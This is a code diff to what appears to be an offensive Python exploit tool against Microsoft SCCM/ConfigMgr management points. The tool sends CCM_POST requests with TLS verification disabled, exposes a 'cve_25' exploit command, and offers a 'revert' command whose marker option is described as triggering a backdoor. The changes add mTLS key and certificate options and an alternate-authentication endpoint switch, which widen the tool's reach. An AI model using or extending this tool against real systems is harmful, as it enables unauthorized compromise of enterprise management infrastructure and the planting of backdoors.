@@ -17,7 +17,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SCCM_SQL_HTTP:
 
-    unauth_request_endpoint = "/ccm_system_altauth/request"
 
     dummy_package_id = f"UID:{uuid.uuid4()}"
 
@@ -60,17 +59,18 @@ END
 """
 
 
-    def __init__(self, target, key, cert):
+    def __init__(self, target, key, cert, altAuth):
         self._target = target
+        self._target_url = f"{target}/ccm_system_altauth/request" if altAuth else f"{target}/ccm_system/request"
         self._pkey = key
         self._cert = cert
 
 
-    def __ccm_post(self, path, data):
+    def __ccm_post(self, data):
         headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'}
         
         #print(f">>>> HTTP Request <<<<<\n{data.decode('utf-16-le')}\n")
-        r = requests.request("CCM_POST", f"{self._target}{path}", headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
+        r = requests.request("CCM_POST", self._target_url, headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
         logging.debug(f">>>> Response : {r.status_code} {r.reason} <<<<<\n{r.text[:8000]}\n")
         try:
             multipart_data = multipart.decoder.MultipartDecoder.from_response(r)
@@ -90,7 +90,7 @@ END
         # print(f">>>> Header <<<<<\n{header}\n")
         logging.debug(f">>>> Request <<<<<\n{request.decode()}\n")
 
-        return self.__ccm_post(self.unauth_request_endpoint, multipart_body)
+        return self.__ccm_post(multipart_body)
 
     # MP_GetAssignedSite
     def do_revert(self, marker='ABC'):
@@ -155,8 +155,10 @@ if __name__ == "__main__":
     cve_25.add_argument("-rs", "--registration-sleep", action="store", required=False, default=2, help="The amount of time, in seconds, that should be waited after registrating a new device (2 seconds by default)")
    
     revert_parser = subparsers.add_parser('revert', help="Revert the changes to the original SPO")
-    revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
     revert_parser.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
+    revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
+    revert_parser.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
+    revert_parser.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")
 
 
     args = parser.parse_args()
@@ -168,7 +170,7 @@ if __name__ == "__main__":
         logging.getLogger().setLevel(logging.INFO)
 
     if args.command == 'revert':
-        SCCM_SQL_HTTP(args.target, None, None).do_revert(args.marker)
+        SCCM_SQL_HTTP(args.target, args.key, args.cert, altAuth=args.altauth).do_revert(args.marker)
     else :
         try:
             # Dynamic import
